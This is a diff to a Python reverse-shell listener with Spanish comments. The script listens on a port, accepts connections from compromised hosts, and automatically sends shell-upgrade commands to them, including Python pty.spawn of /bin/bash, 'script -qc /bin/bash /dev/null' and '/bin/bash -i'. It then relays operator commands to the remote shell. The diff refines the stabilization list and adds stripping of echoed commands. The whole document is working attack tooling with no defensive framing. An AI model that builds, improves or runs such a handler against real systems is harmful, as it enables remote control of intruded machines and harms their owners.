@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-
 import socket
 import threading
 import os
@@ -18,22 +17,26 @@ def clean_output(data):
     return data.decode('utf-8', errors='ignore').strip()
 
 def stabilize_shell(client):
-    # Intentar diferentes versiones de Python
-    python_commands = [
+    # Intentar diferentes versiones de estabilización
+    stabilization_commands = [
+        # Python options (si están disponibles)
         b'python -c "import pty; pty.spawn(\'/bin/bash\')"\n',
         b'python3 -c "import pty; pty.spawn(\'/bin/bash\')"\n',
-        b'echo "stty raw -echo; fg" > /tmp/.stab && chmod +x /tmp/.stab\n'
+        # Non-Python options
+        b'script -qc /bin/bash /dev/null\n',
+        b'/bin/bash -i\n'
     ]
     
     # Enviar comandos de estabilización
-    for cmd in python_commands:
+    for cmd in stabilization_commands:
         client.send(cmd)
         time.sleep(0.5)
     
     # Configurar entorno terminal
-    client.send(b'export TERM=xterm-256color\n')
+    client.send(b'export TERM=xterm\n')
     client.send(b'stty rows 40 columns 180\n')
-    # Desactivar el eco en el lado remoto
+    
+    # Intentar desactivar el eco
     client.send(b'stty -echo\n')
     time.sleep(1)
 
@@ -46,20 +49,36 @@ def handler(client, address, port):
     # Automatizar estabilización
     stabilize_shell(client)
     
+    # Variable para almacenar el último comando enviado
+    last_command = ""
+    
     try:
         while True:
             sockets = [client, sys.stdin]
             read_sockets, _, _ = select.select(sockets, [], [])
-
+            
             for sock in read_sockets:
                 if sock == client:
                     data = client.recv(4096)
                     if not data:
                         print("\n[!] Cliente desconectado.")
                         return
-                    print(clean_output(data), end='\n', flush=True)
+                    
+                    # Limpiar la salida
+                    output = clean_output(data)
+                    
+                    # Eliminar el eco del comando
+                    if last_command and last_command in output:
+                        output = output.replace(last_command, "", 1)
+                    
+                    # Eliminar espacios en blanco
+                    output = output.strip()
+                    
+                    if output:  # Solo imprimir si hay contenido
+                        print(output, flush=True)
                 else:
                     cmd = sys.stdin.readline()
+                    last_command = cmd.strip()
                     client.send(cmd.encode())
     except Exception as e:
         print(f"\n[!] Error: {str(e)}")
@@ -71,9 +90,7 @@ def start_server(port):
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.bind(("0.0.0.0", port))
     server.listen(5)
-
     print(f"[*] Escuchando en 0.0.0.0:{port}...\n")
-
     try:
         while True:
             client, addr = server.accept()
@@ -88,7 +105,6 @@ if __name__ == "__main__":
     if len(sys.argv) != 2:
         print(f"Uso: {sys.argv[0]} <puerto>")
         sys.exit(1)
-
     try:
         port = int(sys.argv[1])
         start_server(port)
